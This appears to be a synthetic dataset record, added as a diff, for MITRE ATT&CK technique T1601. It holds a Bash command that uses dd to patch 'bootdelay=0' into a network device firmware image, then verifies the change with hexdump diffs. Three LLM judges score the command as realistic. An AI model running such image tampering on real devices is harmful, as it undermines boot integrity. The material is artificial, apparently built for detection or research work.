@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "echo -n 'bootdelay=0' | dd of=/var/tmp/modified_system.img bs=1 seek=$((0x4F200)) conv=notrunc && diff -u <(dd if=/bootflash/prod_system.img bs=1 skip=$((0x4F000)) count=$((0x0400)) 2>/dev/null | hexdump -C) <(dd if=/var/tmp/modified_system.img bs=1 skip=$((0x4F000)) count=$((0x0400)) 2>/dev/null | hexdump -C)",
+  "explanation": "Patches bytes in a suspected bootloader environment region inside the system image and diffs hexdumps of the region to confirm the alteration.",
+  "rationale_steps": [
+    "Write new bytes at a targeted offset within the firmware image using dd (root-only).",
+    "Extract and hexdump the relevant region from both images.",
+    "Use diff to validate low-level modification within the system image."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1601-6048333d-ab67c808",
+  "source_prompt_hash": "6048333d",
+  "timestamp_utc": "2025-09-30T04:32:34.003779Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash command using pipelines, arithmetic expansion, process substitution, and valid dd/diff/hexdump options with balanced quoting.",
+        "semantic_score": 4,
+        "semantic_justification": "Accurately patches bytes at a specific offset and diffs the region against the original image, aligning with modifying a system image, though it assumes the target image already exists as a copy and is accessible.",
+        "combined_score": 4.5,
+        "confidence": 0.86,
+        "timestamp": "2025-10-02T17:52:03.813799Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced parentheses, proper process substitution syntax, valid dd flags (bs, seek, skip, count, conv), correct use of &&, pipes, and hexdump, with no syntax errors.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1601 by patching a specific byte offset (0x4F200) in a system image file to set 'bootdelay=0' (a classic bootloader environment variable manipulation to bypass boot delays/security checks), then verifies the modification by diffing hexdumps of the affected region against the original production image, which is operationally realistic and directly aligned with in-storage firmware image modification.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2026-02-19T01:15:27.836225Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses valid Bash syntax, including pipe-lining, process substitution, arithmetic expansion, and standard utility flags for dd, diff, and hexdump.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately demonstrates the technique of patching an image file at a specific offset to modify bootloader behavior and utilizes a diff of hexdumps to verify the integrity of the change.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-19T01:15:32.016477Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
